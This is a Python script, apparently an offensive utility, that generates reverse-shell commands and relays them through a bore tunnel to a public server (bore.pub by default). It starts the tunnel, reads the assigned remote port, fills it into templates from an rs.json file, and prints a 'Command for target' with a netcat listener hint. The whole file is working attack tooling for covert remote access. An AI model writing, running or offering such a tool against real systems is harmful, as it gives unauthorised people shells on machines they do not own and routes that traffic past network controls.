#!/usr/bin/env python3
import subprocess
import sys
import re
import os
import json
import time
import threading
import argparse

CONFIG_FILE = "rs.json"

def load_revshells():
    if not os.path.exists(CONFIG_FILE):
        print("[-] %s not found." % CONFIG_FILE)
        sys.exit(1)
    try:
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
    except json.JSONDecodeError as e:
        print("[-] %s is not valid JSON: %s" % (CONFIG_FILE, e))
        sys.exit(1)
    if not isinstance(data, dict) or not data:
        print("[-] %s is empty or not an object." % CONFIG_FILE)
        sys.exit(1)
    for key, val in data.items():
        if not isinstance(val, dict) or "cmd" not in val:
            print("[-] %s: entry '%s' missing 'cmd'." % (CONFIG_FILE, key))
            sys.exit(1)
    return data

def validate_port(value):
    if not value.isdigit():
        return None
    port = int(value)
    if not (1 <= port <= 65535):
        return None
    return port

def format_payload(template, host, port):
    return template.replace("{host}", host).replace("{port}", str(port))

def build_bore_cmd(local_port, bore_server, bore_port=None):
    cmd = ["bore", "local", str(local_port), "--to", bore_server]
    if bore_port:
        cmd += ["--port", str(bore_port)]
    return cmd

def start_bore(local_port, bore_server, bore_port=None):
    cmd = build_bore_cmd(local_port, bore_server, bore_port)
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError:
        print("[-] bore not found in PATH. Install: cargo install bore-cli")
        sys.exit(1)
    return proc

def parse_remote_port(proc, timeout=20):
    result = {"port": None}
    done = threading.Event()

    def reader():
        for line in proc.stdout:
            sys.stderr.write(line)
            sys.stderr.flush()
            if result["port"] is None:
                for pat in (r"remote_port=(\d+)", r"listening at \S+:(\d+)"):
                    m = re.search(pat, line)
                    if m:
                        result["port"] = m.group(1)
                        done.set()
                        break
        done.set()

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    done.wait(timeout)
    return result["port"]

def show_menu(items):
    print("\n[+] Available reverse shells:")
    for idx, (key, meta) in enumerate(items, 1):
        platform = meta.get("platform", "?")
        preview = meta["cmd"][:60].replace("\n", " ")
        print("  %2d. %-22s [%-8s] %s" % (idx, key, platform, preview))
    print("   0. Exit")

def search_menu(items, query):
    q = query.lower()
    hits = [(i, k, m) for i, (k, m) in enumerate(items, 1) if q in k.lower()]
    if not hits:
        print("[-] No matches for '%s'." % query)
        return
    for i, k, m in hits:
        print("  %2d. %-22s [%-8s]" % (i, k, m.get("platform", "?")))

def pick_template(items, selection):
    if selection.isdigit():
        idx = int(selection) - 1
        if 0 <= idx < len(items):
            return items[idx][0], items[idx][1]
        return None, None
    for key, meta in items:
        if key == selection:
            return key, meta
    return None, None

def listener_hint(listener, local_port):
    if listener.startswith("nc"):
        return "%s -lvnp %s" % (listener, local_port)
    if listener == "http":
        return "python3 -m http.server %s" % local_port
    if listener.startswith("ncat"):
        return "%s %s" % (listener, local_port)
    return "listener on port %s (%s)" % (local_port, listener)

def run_interactive(items, local_port, bore_server, bore_port=None):
    print("[*] Starting bore in background...")
    bore_proc = start_bore(local_port, bore_server, bore_port)

    show_menu(items)
    while True:
        sel = input("[?] Number, name, or /search: ").strip()
        if sel == "0":
            bore_proc.terminate()
            bore_proc.wait()
            sys.exit(0)
        if sel.startswith("/"):
            search_menu(items, sel[1:])
            continue
        key, meta = pick_template(items, sel)
        if meta:
            break
        print("[-] Invalid selection.")

    print("[*] Waiting for bore remote port...")
    remote_port = parse_remote_port(bore_proc)
    if not remote_port:
        bore_proc.terminate()
        bore_proc.wait()
        print("[-] Failed to get remote port.")
        sys.exit(1)

    listener = meta.get("listener", "nc")
    background = meta.get("background", True)

    print("\n[+] Remote: %s:%s" % (bore_server, remote_port))
    print("[+] Listener: %s" % listener)
    print("[+] Run this in another terminal:")
    print("      %s" % listener_hint(listener, local_port))

    payload = format_payload(meta["cmd"], bore_server, remote_port)
    print("\n[+] Command for target:")
    print(payload)
    if not background:
        print("[!] This template does not support background execution. Do not append '&'.")

    print("\n[+] Waiting. Ctrl+C to stop bore.")
    try:
        while True:
            if bore_proc.poll() is not None:
                print("[-] Bore terminated.")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping.")
    finally:
        bore_proc.terminate()
        bore_proc.wait()

def run_select(items, key, local_port, bore_server, bore_port=None):
    meta = None
    for k, m in items:
        if k == key:
            meta = m
            break
    if meta is None:
        print("[-] Unknown template: %s" % key)
        sys.exit(1)

    print("[*] Starting bore in background...")
    bore_proc = start_bore(local_port, bore_server, bore_port)

    print("[*] Waiting for bore remote port...")
    remote_port = parse_remote_port(bore_proc)
    if not remote_port:
        bore_proc.terminate()
        bore_proc.wait()
        print("[-] Failed to get remote port.")
        sys.exit(1)

    listener = meta.get("listener", "nc")

    print("\n[+] Remote: %s:%s" % (bore_server, remote_port))
    print("[+] Listener: %s" % listener)
    print("[+] Run this in another terminal:")
    print("      %s" % listener_hint(listener, local_port))

    payload = format_payload(meta["cmd"], bore_server, remote_port)
    print("\n[+] Command for target:")
    print(payload)

    print("\n[+] Waiting. Ctrl+C to stop bore.")
    try:
        while True:
            if bore_proc.poll() is not None:
                print("[-] Bore terminated.")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping.")
    finally:
        bore_proc.terminate()
        bore_proc.wait()

def list_templates(items):
    for key, meta in items:
        print("%-22s [%-8s] %s" % (key, meta.get("platform", "?"), meta["cmd"]))

def main():
    ap = argparse.ArgumentParser(description="Reverse shell generator via bore tunnel")
    ap.add_argument("-l", "--local-port", type=int,
                    help="local port to expose through bore")
    ap.add_argument("-b", "--bore-server", default="bore.pub",
                    help="bore server (default: bore.pub)")
    ap.add_argument("-p", "--bore-port", type=int,
                    help="requested remote port on the bore server")
    ap.add_argument("-s", "--select", help="template name (skip menu)")
    ap.add_argument("--list", action="store_true", help="list templates and exit")
    args = ap.parse_args()

    custom = load_revshells()
    items = list(custom.items())

    if args.list:
        list_templates(items)
        sys.exit(0)

    if not args.local_port:
        raw = input("[?] Local port to expose: ").strip()
        port = validate_port(raw)
        if port is None:
            print("[-] Invalid port.")
            sys.exit(1)
        local_port = port
    else:
        local_port = validate_port(str(args.local_port))
        if local_port is None:
            print("[-] Invalid port.")
            sys.exit(1)

    bore_server = args.bore_server

    if args.select:
        run_select(items, args.select, local_port, bore_server, args.bore_port)
    else:
        run_interactive(items, local_port, bore_server, args.bore_port)

if __name__ == "__main__":
    main()
